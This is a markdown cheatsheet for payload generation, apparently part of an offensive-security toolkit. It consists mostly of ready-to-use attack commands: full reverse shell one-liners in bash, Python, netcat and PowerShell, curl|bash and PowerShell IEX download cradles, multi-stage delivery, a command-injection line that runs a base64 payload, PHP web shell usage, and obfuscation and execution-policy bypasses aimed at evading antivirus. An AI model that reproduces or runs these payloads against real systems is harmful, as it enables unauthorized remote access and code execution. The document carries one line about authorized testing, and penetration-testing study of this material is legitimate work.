# Payload Generation Cheatsheet

**Skill Level**: Intermediate [I]

Quick reference for payload creation, encoding, and delivery.

> **Before using this cheatsheet**: Understand payload concepts by reading the [Payload Generator Walkthrough](../walkthroughs/payload-generator-walkthrough.md) first. For term definitions, see the [Glossary](../GLOSSARY.md).

> **Safety**: Only generate payloads for authorized testing. Test in isolated lab environments.

---

## Reverse Shell Quick Reference

### Bash

```bash
python3 payload_generator.py --type reverse_shell --lang bash --lhost <IP> --lport 4444
```

**Output:**
```bash
bash -i >& /dev/tcp/<IP>/4444 0>&1
```

### Python

```bash
python3 payload_generator.py --type reverse_shell --lang python --lhost <IP> --lport 4444
```

### PowerShell

```bash
python3 payload_generator.py --type reverse_shell --lang powershell --lhost <IP> --lport 4444
```

### PHP

```bash
python3 payload_generator.py --type reverse_shell --lang php --lhost <IP> --lport 4444
```

---

## Encoding Options

### Base64 (Command Line Safe)

```bash
python3 payload_generator.py --type reverse_shell --lang bash --lhost <IP> --encoding base64
```

**Execute:**
```bash
echo <base64> | base64 -d | bash
```

### Base64 PowerShell

```bash
python3 payload_generator.py --type reverse_shell --lang powershell --lhost <IP> --encoding base64
```

**Execute:**
```powershell
powershell -enc <base64>
```

### Hex Encoding

```bash
python3 payload_generator.py --type reverse_shell --lang python --lhost <IP> --encoding hex
```

---

## Obfuscation Levels

| Level | Effect | Use Case |
|-------|--------|----------|
| 0 | None | Testing |
| 1 | Basic strings | Light AV |
| 2 | Variables + encoding | Moderate AV |
| 3 | Advanced | Strong AV |

```bash
# Obfuscated PowerShell
python3 payload_generator.py --type reverse_shell --lang powershell --lhost <IP> --obfuscate 2
```

---

## Handler Setup

### Basic Handler

```bash
python3 reverse-shell-handler/tool.py -l 4444
```

### SSL Handler

```bash
python3 reverse-shell-handler/tool.py -l 443 --ssl
```

### Multi-Session

```bash
python3 reverse-shell-handler/tool.py -l 4444 --multi
```

### Show Payloads

```bash
python3 reverse-shell-handler/tool.py --payloads -H <your_ip> -l 4444
```

---

## Web Shells

### PHP Web Shell

```bash
python3 payload_generator.py --type web_shell --lang php
```

**Usage:**
```
http://target/shell.php?cmd=whoami
```

### Obfuscated PHP

```bash
python3 payload_generator.py --type web_shell --lang php --obfuscate 2
```

---

## Shellcode Encoding

### Single Encoder

```bash
# XOR
python3 shellcode_encoder.py -i shellcode.bin -e xor

# RC4 (stronger)
python3 shellcode_encoder.py -i shellcode.bin -e rc4
```

### Chain Encoding

```bash
python3 shellcode_encoder.py -i shellcode.bin --chain xor,add,rot
```

### Output Formats

| Format | Command | Use |
|--------|---------|-----|
| Python | `-f python` | Python loaders |
| C Array | `-f c_array` | C/C++ |
| PowerShell | `-f powershell` | PS loaders |
| C# | `-f csharp` | .NET |

```bash
python3 shellcode_encoder.py -i shellcode.bin -e xor -f python
```

### Bad Character Avoidance

```bash
python3 shellcode_encoder.py -i shellcode.bin -e xor --null-free --bad-chars 000a0d
```

---

## Platform Selection Guide

| Target | Language | Why |
|--------|----------|-----|
| Linux Server | bash | Universal |
| Linux + Python | python | More features |
| Windows | powershell | Built-in |
| Windows + AV | powershell + obfuscate | Evasion |
| Web Server (PHP) | php | Server-side |
| Web Server (CGI) | bash/python | Depends on env |

---

## Common Delivery Methods

### Command Injection

```bash
; echo <base64_payload> | base64 -d | bash
```

### File Upload

1. Generate web shell
2. Upload via vulnerable form
3. Access via browser

### Download Cradle (PowerShell)

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')"
```

### Download Cradle (Linux)

```bash
curl http://<IP>/shell.sh | bash
wget -O - http://<IP>/shell.sh | bash
```

---

## Multi-Stage Payloads

### Stage 1: Downloader

```bash
# Linux
curl http://<IP>:8080/stage2.sh | bash

# PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://<IP>:8080/stage2.ps1')
```

### Stage 2: Full Payload

```bash
python3 payload_generator.py --type reverse_shell --lang bash --lhost <IP> > stage2.sh
```

### Setup

```bash
# Terminal 1: Serve payload
python3 -m http.server 8080

# Terminal 2: Handler
python3 reverse-shell-handler/tool.py -l 4444
```

---

## Shell Upgrade

### Stabilize Linux Shell

```bash
# On target
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Stabilize Windows Shell

```powershell
# PowerShell provides good shell
# No upgrade typically needed
```

---

## Quick Payload Matrix

| Scenario | Command |
|----------|---------|
| Linux bash | `--type reverse_shell --lang bash --lhost <IP>` |
| Linux python | `--type reverse_shell --lang python --lhost <IP>` |
| Windows PS | `--type reverse_shell --lang powershell --lhost <IP>` |
| Windows + AV | `--type reverse_shell --lang powershell --lhost <IP> --obfuscate 2 --encoding base64` |
| PHP web shell | `--type web_shell --lang php` |
| PHP reverse | `--type reverse_shell --lang php --lhost <IP>` |

---

## Troubleshooting

### No Connection Received

1. Check handler is listening: `netstat -tlnp | grep <port>`
2. Verify LHOST is reachable from target
3. Check firewall allows inbound on port
4. Confirm payload has correct IP/port

### Shell Dies Immediately

- Upgrade to PTY (see above)
- Check for job control issues
- Verify interpreter exists on target

### Payload Detected

1. Increase obfuscation level
2. Use encoding
3. Try different language
4. Consider staged payload

### PowerShell Blocked

```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -enc <payload>
```

---

## OPSEC Notes

> **OPSEC** (Operational Security): Practices to avoid detection during security testing.

### Handler Visibility

- Listening ports visible in netstat/ss on your attack machine
- Consider using common ports (80, 443) to blend in
- SSL reduces content inspection by network security devices
- **Detection Awareness**: Network monitoring may alert on unusual outbound connections from targets

### Payload Artifacts

- Encoded payloads leave traces in logs (PowerShell logs Base64 decoding)
- Web shells leave files on disk (forensic evidence)
- Consider cleanup procedures after testing
- **Detection Awareness**: Windows Defender and AMSI may log payload content even if execution fails

### Traffic Patterns

- Raw reverse shells have distinct patterns (bidirectional TCP with shell-like timing)
- SSL/TLS helps avoid deep packet inspection
- Consider DNS/HTTP tunneling for environments with strict egress filtering
- **Detection Awareness**: Modern EDRs correlate process behavior with network connections

### What Defenders See

| Action | Logged By | Detection Likelihood |
|--------|-----------|---------------------|
| PowerShell reverse shell | Event ID 4104 (Script Block Logging) | HIGH |
| Python reverse shell | Process creation, network connection | MEDIUM |
| Web shell upload | Web server logs, file integrity monitoring | HIGH |
| Encoded payload execution | AMSI logs, behavioral analysis | MEDIUM |

---

## Quick Reference Card

```
+------------------------------------------+
|       PAYLOAD GENERATION QUICK REF       |
+------------------------------------------+
| REVERSE SHELL:                           |
| python3 payload_generator.py             |
|   --type reverse_shell                   |
|   --lang <bash|python|powershell|php>    |
|   --lhost <IP> --lport <PORT>            |
|                                          |
| WITH ENCODING:                           |
|   --encoding base64                      |
|                                          |
| WITH OBFUSCATION:                        |
|   --obfuscate <0-3>                      |
|                                          |
| WEB SHELL:                               |
| python3 payload_generator.py             |
|   --type web_shell --lang php            |
|                                          |
| HANDLER:                                 |
| python3 reverse-shell-handler/tool.py    |
|   -l <PORT>                              |
|                                          |
| SHELLCODE ENCODE:                        |
| python3 shellcode_encoder.py             |
|   -i <file> -e xor -f python             |
+------------------------------------------+
| REMEMBER: Start handler BEFORE payload!  |
+------------------------------------------+
```

---

## Emergency Commands

### Quick Bash Shell

```bash
bash -i >& /dev/tcp/<IP>/4444 0>&1
```

### Quick Python Shell

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Quick Netcat

```bash
# With -e
nc -e /bin/sh <IP> 4444

# Without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f
```

### Quick PowerShell

```powershell
$c=New-Object Net.Sockets.TCPClient('<IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)}
```
